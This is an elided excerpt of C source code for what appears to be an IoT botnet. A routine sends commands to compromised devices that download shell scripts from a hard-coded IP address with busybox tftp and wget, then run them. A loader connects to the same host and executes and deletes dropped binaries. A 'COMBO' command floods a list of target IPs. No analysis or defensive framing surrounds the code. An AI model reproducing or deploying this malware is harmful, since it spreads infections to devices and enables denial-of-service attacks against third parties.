...
void echoLoader()
{
        ...
        int fd;
        fd = socket_connect("185.112.248.68", 80); 
...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox tftp 185.112.248.68 -c get tftp.sh;sh tftp.sh;busybox tftp -r tftp2.sh -g 185.112.248.68; sh tftp2.sh;busybox wget http://185.112.248.68/gtop.sh;chmod +x gtop.sh; sh gtop.sh\r\n", 237, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
            ...
            case 102:
            	{
            		echoLoader();
					send(fds[i].fd, "sh x;chmod +x z;./z;rm -rf z;rm -f x\r\n", 38, MSG_NOSIGNAL); // wowowowowowooww
					fds[i].state = 103;
            	}
            	break;
...
*/
	...
	if(!strcmp(argv[0], "COMBO"))
	{
		...
		if(strstr(ip, ",") != NULL)
		{
			sockprintf(mainCommSock, "COMBO Flooding %s:%d for %d seconds.", ip, port, time);
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
